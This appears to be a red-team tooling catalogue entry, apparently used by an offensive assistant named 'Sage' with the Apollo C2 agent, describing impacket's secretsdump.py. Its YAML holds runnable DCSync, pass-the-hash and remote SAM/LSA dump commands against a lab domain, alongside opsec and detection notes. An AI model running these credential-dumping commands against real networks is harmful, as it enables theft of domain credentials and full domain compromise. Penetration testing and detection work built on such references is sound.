---
name: impacket-secretsdump
category: credential-access
subcategories: [dcsync, remote-sam-dump, lsa-secrets, ntds]
tradecraft_tags: [impacket, dcsync, ntds, sam, lsa, python, remote-dump, secretsdump]
mitre_attack:
  - id: T1003.006
    name: OS Credential Dumping — DCSync
  - id: T1003.002
    name: OS Credential Dumping — Security Account Manager
  - id: T1003.003
    name: OS Credential Dumping — NTDS
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: secretsdump.py
supported_os: [linux, windows]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  Network-based DCSync (replication RPC) generates Event 4662 (Object Access with
  Replicating Directory Changes) on DCs. Remote SAM/LSA dump via SMB generates
  authentication events on the target (Event 4624). impacket's network protocol
  implementation is detectable by EDR/IDS pattern matching for replication traffic
  from non-DC sources.
usage_examples:
  - description: DCSync all hashes from a DC (Python-side alternative to mimikatz)
    args: "secretsdump.py -dc-ip 192.168.56.10 north.sevenkingdoms.local/jon.snow:Password123"
  - description: DCSync with NTLM hash (pass-the-hash)
    args: "secretsdump.py -hashes :nthash -dc-ip 192.168.56.10 north.sevenkingdoms.local/administrator"
  - description: Remote SAM/LSA dump on a member server
    args: "secretsdump.py -dc-ip 192.168.56.10 north.sevenkingdoms.local/administrator:Password123@192.168.56.22"
  - description: Dump from NTDS.dit file (offline, after extraction)
    args: "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL"
  - description: DCSync for specific users only
    args: "secretsdump.py -dc-ip 192.168.56.10 north.sevenkingdoms.local/jon.snow:Password123 -just-dc-user krbtgt"
opsec_notes: |
  Python tool — runs from attacker infrastructure. Network-based DCSync generates
  Sysmon network events showing a non-DC host issuing replication RPC calls. This is
  detectable by MDI (Defender for Identity) and network monitoring. For Windows-side
  DCSync, Apollo's native `dcsync` command or Mimikatz `lsadump::dcsync` are more
  common. secretsdump is most useful when operating entirely from Linux infrastructure.
gotchas: |
  Python-only — not Apollo-runnable. The DCSync path requires the authenticating
  account to have GetChangesAll rights on the domain object (DA, krbtgt, or explicit
  delegation). Remote SAM/LSA dump requires admin on the target machine and SMB access.
  secretsdump.py can take a long time on large domains when dumping all hashes;
  use `-just-dc-user` to limit to specific accounts.
related_ttps: [mimikatz, sharpkatz, nanodump, rubeus]
alternatives: [mimikatz-dcsync, apollo-native-dcsync, crackmapexec-ntds]
common_args:
  target:
    description: Target in DOMAIN/user:password@host format
    typical_values: ["north.sevenkingdoms.local/jon.snow:Password123", "DOMAIN/admin:pass@DC_IP"]
    required: true
  -dc-ip:
    description: Domain controller IP
    typical_values: ["192.168.56.10"]
    required: true
  -hashes:
    description: NTLM hashes (LM:NT) for pass-the-hash
    typical_values: [":nthash"]
  -just-dc-user:
    description: Only dump credentials for a specific user
    typical_values: ["krbtgt", "administrator"]
  -ntds:
    description: Path to NTDS.dit file for offline parsing
    typical_values: ["ntds.dit"]
  -system:
    description: Path to SYSTEM hive for offline parsing
    typical_values: ["SYSTEM"]
last_updated: 2026-05-29
---

# impacket-secretsdump

Fortra's (formerly Core Security) impacket library's `secretsdump.py` — the Python-side
DCSync and remote credential dump tool. Implements DC replication protocol (MS-DRSR) to
pull hashes directly from any DC, remote SAM/LSA dump over SMB, and offline NTDS.dit
parsing. This is the Linux-infrastructure equivalent of Apollo's native `dcsync` command
and Mimikatz `lsadump::dcsync`.

## Typical use cases
- DCSync from Linux without a Windows foothold (pull all domain hashes)
- Remote SAM/LSA dump on member servers using admin credentials
- Offline NTDS.dit parsing after extracting the database from a DC
- Pass-the-hash DCSync when NT hash is available but not password

## How Sage uses this
secretsdump is infrastructure-side Python tooling. For Apollo-based DCSync, Apollo's
native `dcsync` command is preferred. secretsdump is documented for completeness in
Linux-side post-exploitation chains.

## Apollo-specific note
Python-only — not Apollo-runnable. For Windows-side DCSync, use Apollo's native
`dcsync` command (no binary upload needed).
